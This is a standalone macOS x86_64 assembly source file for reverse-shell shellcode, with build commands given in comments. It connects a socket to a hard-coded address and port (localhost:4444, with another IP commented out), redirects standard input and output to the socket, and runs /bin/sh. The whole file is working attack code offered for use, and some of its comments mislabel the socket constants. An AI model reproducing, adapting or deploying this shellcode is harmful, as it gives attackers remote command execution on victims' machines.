;nasm -f macho reverse_tcp.s -o reverse_tcp.o
;ld -o reverse_shell -e start reverse_tcp.o

BITS 64
    
section .text
global start

start:
 	xor rbx, rbx
	xor rdx, rdx

;Socket
	mov rax, 0x2000061 ;97 AUE_SOCKET  ALL { int socket(int domain, int type, int protocol); }
	mov rdi, 2 ;SOCK_STREAM
	mov rsi, 1 ;AF_NET
	mov rdx, rdx ;0
	syscall

	mov r12, rax ; Save the socket

;Sock_addr
	;		10.69.69.3 4444 
	;mov r13, 0x0345450A5C110002
	;		127.0.0.1 4444
	mov r13, 0x0100007F5C110002
	push r13
	mov r13, rsp

;Connect
	mov rax, 0x2000062 ;98 AUE_CONNECT ALL { int connect(int s, caddr_t name, socklen_t namelen); 
	mov rdi, r12 
	mov rsi, r13
	mov rdx, 16
	syscall

	xor rsi, rsi

dup:
	mov rax, 0x200005A ;90 AUE_DUP2    ALL { int dup2(u_int from, u_int to); }
	mov rdi, r12
	syscall
	
	cmp rsi, 0x2
	inc rsi 
	jbe dup

;	mov rax, 0x200005A ;90 AUE_DUP2    ALL { int dup2(u_int from, u_int to); }
;	mov rdi, r12
;	xor rsi, rsi
;	syscall	

;	mov rax, 0x200005A ;90 AUE_DUP2    ALL { int dup2(u_int from, u_int to); }
;	mov rdi, r12
;	inc rsi
;	syscall	

;	mov rax, 0x200005A ;90 AUE_DUP2    ALL { int dup2(u_int from, u_int to); }
;	mov rdi, r12
;	inc rsi
;	syscall	

;Exec
    mov r8, '/bin/sh'
    push r8
    mov rdi, rsp 
    mov rax, 0x200003B ;59 AUE_EXECVE  ALL { int execve(char *fname, char **argp, char **envp); }
    xor rsi, rsi 
    xor rdx, rdx 
    syscall

;Close
;	mov rax, 0x2000006
;	mov rdi, r12
;	syscall

;Exit

;	mov rdi, rax
;	mov rax, 0x2000001      ; System call number for exit = 1
;	mov rdi, r13              ; Exit success = 0
;	syscall                 ; Invoke the kernel

